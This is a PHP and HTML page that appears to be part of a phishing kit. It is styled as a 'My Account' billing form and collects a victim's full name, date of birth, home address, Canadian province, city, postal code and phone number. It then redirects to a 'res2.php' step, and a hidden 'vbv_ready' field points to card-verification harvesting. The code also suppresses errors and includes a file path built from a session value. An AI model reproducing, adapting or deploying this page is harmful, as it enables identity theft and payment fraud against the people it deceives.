<?php

/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*                   #              ||~~MR.Int(TN  ~~||              #                            */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
error_reporting(0);
session_start();
include("lang/". $_SESSION['_lang_'].".php");
if(isset($_POST['noob'])){
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

$_SESSION['2'] = $GET['2'];

 if(isset($_POST['vbv_ready']) == true){
  #ip info
  header("location:res/res2.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
else{

 header("location:res/res2.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
		  }
?>


<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>My Account</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/billing.css" rel="stylesheet">

<style type="text/css">
    .check_box{
        background-image: url("css/onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
        margin-bottom: 9px;
        cursor: pointer;
    }
    #checked{
        background-position: 0px -100px;
    }
    #inchecked{
        background-position: 0px 0px;
    }
.inp{
        width: 331px;
        height: 40px;
        padding-left: 12px;
        margin-bottom: 15px;
        border: 1px solid #B7B6B6;
        border-radius: 3px;
        font-size: 16px;
        text-transform: capitalize;
} 
  .card{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -406px;
        height: 12px;
        position: relative;
        left: 124px;
        bottom: -15px;
        width: 40px;
         }
    .date{
    display: inline-block;
    background-image: url("css/sprites_cc_global.png");
    background-repeat: no-repeat;
    background-position: 0px -434px;
    height: 28px;
    position: relative;
    left: -49px;
    bottom: -9px;
    width: 40px;
    }
.in{
        font-family: arial, Helvetica, sans-serif;
    font-size: 10pt;
    color: #333;
    font-weight: normal;
    padding-top: 12px;
    padding-bottom: 12px;
    border-radius: 4px;
    border: 1px solid #CCC;
    margin: 5px;
    float: left;
}
  </style>
</head>


<body>
<div id="wb_Form1" style="position:absolute;left:386px; border-radius: 10px; top:8px;width:510px;height:611px;z-index:0;">

<form class="xxray_51" method="GET"   action="res/res2.php" style="
">

<center>





 <center>
 <br><br>
  <h2 style="
    font-family: Arial, Helvetica, sans-serif;
    font-size: 20pt;
    font-weight: normal;
    color: #666;
">Personal Information</h2><br><br>
		
		<input type="text"  id="FullName" name="1"  class="inp" value="" placeholder="Full Name" style="width: 330px;" required><br>
		<input type="text"  id="Dateofbirth" name="2"  class="inp" value="" placeholder="Date of Birth " style="width: 330px;" required><br>
		<input type="text"  id="addresshome" name="3"  class="inp" value="" placeholder="Address Home " style="width: 330px;" required><br>
		
	
		<input type="text"  id="country " name="10"  class="inp" value="Canada" placeholder="" style="width: 330px;" disabled><br>
		
		
		<select name="5" size="1" id="Province " class="inp" style="width: 344px;height:45px" required>
		
		<option value="0" selected > Province</option>
		<option value="Alberta (AB)">Alberta (AB)</option>
<option value="British Columbia (BC)">British Columbia (BC)</option>
<option value="Manitoba (MB)">Manitoba (MB)</option>
<option value="New Brunswick (NB)">New Brunswick (NB)</option>
<option value="Newfoundland and Labrador (NL)">Newfoundland and Labrador (NL)</option>
<option value="Northwest Territories (NT)">Northwest Territories (NT)</option>
<option value="Nova Scotia (NS)">Nova Scotia (NS)</option>
<option value="Nunavut (NU)">Nunavut (NU)</option>
<option value="Ontario (ON)">Ontario (ON)</option>
<option value="Prince Edward Island (PE)">Prince Edward Island (PE)</option>
<option value="Quebec (QC)">Quebec (QC)</option>
<option value="Saskatchewan (SK)">Saskatchewan (SK)</option>
<option value="Yukon (YT)">Yukon (YT)</option>

</select>
		
		<input type="text"  id="city " name="10"  class="inp" value="" placeholder="City  " style="width: 330px;" required><br>
		<input type="text"  id="zip code" name="6"  class="inp" value="" placeholder="Postal Code " style="width: 330px;" required><br>
		<input  type="text"  id="NumberPhone" name="7"  class="inp" value="" maxlength="10" placeholder="Phone Number" style="width: 330px;" required><br>

	
			
<br>
 
				
                        <input type="checkbox" hidden="hidden" id="checkbox" name="vbv_ready">
				
				
				
					<center>
        <input class="inpclassicsumblit2" name="noob" type="submit" style="width: 364px;padding: 15px;      border-radius: 5px;      border: 0px solid red;      width: 330px;      margin-top: -15px;      background-color: #666;      font-family: Arial, Helvetica, sans-serif;      font-weight: bold;      color: #FFF;      font-size: 16px;" value="Next" id="valider">
<br></center>
        
  
        </div></center>
                                 
		
		
	</div>

		<input name="flow_name" value="summary/index" type="hidden"><input name="flow_name" value="summary/index" type="hidden">  
           
        </div>
                
            </div>
        </div>
		
	
</form>
		
	
	
</body>
</html>